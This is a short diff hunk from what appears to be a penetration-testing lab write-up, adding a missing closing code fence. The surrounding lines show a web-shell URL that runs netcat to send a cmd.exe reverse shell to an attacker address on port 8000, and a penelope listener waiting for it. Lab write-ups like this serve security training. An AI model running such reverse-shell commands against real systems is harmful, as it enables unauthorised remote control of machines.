@@ -42,6 +42,7 @@ medjed\jerren
 upload nc.exe and get the shell back
 ```console
 http://192.168.174.127:45332/shell.php?cmd=nc.exe -e cmd.exe 192.168.45.180 8000
+```
 ```console
 $ penelope -p 8000
 [+] Listening for reverse shells on 0.0.0.0:8000 →  127.0.0.1 • 10.0.2.15 • 192.168.45.180
